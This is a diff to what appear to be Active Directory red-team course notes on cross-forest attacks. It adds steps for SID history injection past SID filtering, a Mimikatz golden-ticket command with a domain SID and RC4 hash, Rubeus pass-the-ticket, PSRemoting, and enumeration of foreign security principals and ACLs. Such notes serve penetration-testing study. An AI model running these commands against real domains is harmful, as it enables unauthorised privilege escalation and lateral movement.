@@ -240,6 +240,16 @@ The PowerShell cmdlets of the ADModule seems to have a bug, the command shows TG
 * Let's try to access a file share 'eushare' on euvendor-dc of euvendor.local forest from eu.local which is explicitly shared with Domain Admins of eu.local.&#x20;
 * Note that we are hopping trusts from us.techcrop.local to eu.local to euvendor.local!
 
+Hints regarding SID Filtering:
+
+* This is fine but why can't we access all resources just like Intra forest?&#x20;
+* SID Filtering is the answer. It filters high privilege SIDs from the SIDHistory of a TGT crossing forest boundary. This means we cannot just go ahead and access resources in the trusting forest as an Enterprise Admin.
+*   But there is a catch:\
+
+
+    <figure><img src=".gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+* This means, if we have an external trust (or a forest trust with SID history enabled - /enablesidhistory:yes), **we can inject a SIDHistory for RID > 1000 to access resources accessible to that identity or group in the target trusting forest (if SIDHisotry is enabled).**
+
 ### Requirement
 
 * Compromised DC
@@ -273,7 +283,63 @@ Use the TGS to access the target resource which must be explicitly shared:
 ls \\euvendor-dc.euvendor.local\eushare\
 </code></pre>
 
-## AD Certificate Service (CS)
+## Cross Forest - SID Filtering Hints
+
+Find out if SID history is enabled
+
+<pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell"><strong>Get-ADTrust -Filter *
+</strong>  If SIDFilteringForestAware is set to True, it means SIDHistory is enabled across the forest trust.
+</code></pre>
+
+Get users with RID > 1000, which could be used for the attack.
+
+<pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell">Get-ADGroup -Filter * -server euvendor.local  //Gives all the Groups, choose the interesting ones
+Get-ADGroup -Identity EUAdmins -Server euvendor.local  //Check for RID > 1000 which are admins. Do that on the relevant DC or on a machine in that domain
+Get-ADGroup -filter 'SID -ge "S-1-.....-1000"' -server euvendor.local   //all SIDs greater than 1000
+
+Then perform SID history Injection / Create a TGT with SIDHIsotry of the Group EUAdmins:
+Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:eu.local /sid:S-1-5-21-3657428294-2017276338-1274645009 /rc4:799a0ae7e6ce96369aa7f1e9da25175a /service:krbtgt /target:euvendor.local /sids:S-1-5-21-4066061358-3942393892-617142613-1103 /ticket:C:\Users\Public\euvendornet.kirbi"'
+
+Request a TGS:
+C:\Users\Public\Rubeus.exe asktgs /ticket:C:\Users\Public\euvendornet.kirbi /service:HTTP/euvendornet.euvendor.local /dc:euvendor-dc.euvendor.local /ptt
+
+Access the euvendor-net machine using PSRemoting:
+<strong>Invoke-Command -ScriptBlock{whoami} -ComputerName euvendornet.euvendor.local -Authentication NegotiateWithImplicitCredential 
+</strong></code></pre>
+
+
+
+## Cross Forest - Foreign Security Principals
+
+### Description
+
+* A Foreign Security Principal (FSP) represents a Security Principal in a external forest trust or special identities (like Authenticated Users, Enterprise DCs etc.).&#x20;
+* Only SID of a FSP is stored in the Foreign Security Principal Container which can be resolved using the trust relationship.&#x20;
+* FSP allows external principals to be added to domain local security groups. Thus, allowing such principals to access resources in the forest.&#x20;
+* Often, FSPs are ignored, mis-configured or too complex to change/cleanup in an enterprise making them ripe for abuse.
+
+### Tools
+
+Let's enumerate FSPs for the db.local domain using the reverse shell we have there.
+
+{% code overflow="wrap" %}
+```powershell
+Find-ForeignGroup -Verbose
+Find-ForeignUser -Verbose
+
+ADModule
+Get-ADObject -Filter {objectClass -eq "foreignSecurityPrincipal"} 
+```
+{% endcode %}
+
+## Cross Forest - ACLs
+
+* Access to resources in a forest trust can also be provided without using FSPs using ACLs.
+* Principals added to ACLs do NOT show up in the ForeignSecurityPrinicpals container as the container is populated only when a principal is added to a domain local security group.
+
+Find-InterestingDomainAcl -Domain dbvendor.local
+
+## $AD Certificate Service (CS)
 
 ### Description
 
@@ -286,7 +352,7 @@ ls \\euvendor-dc.euvendor.local\eushare\
 * Certificate Template - Defines settings for a certificate. Contains information like - enrolment permissions, EKUs, expiry etc.
 * EKU OIDs - Extended Key Usages Object Identifiers. These dictate the use of a certificate template (Client authentication, Smart Card Logon, SubCA etc.)
 
-<figure><img src=".gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>
 
 There are various ways of abusing ADCS! (See the link to "Certified PreOwned" paper in slide notes):&#x20;
 
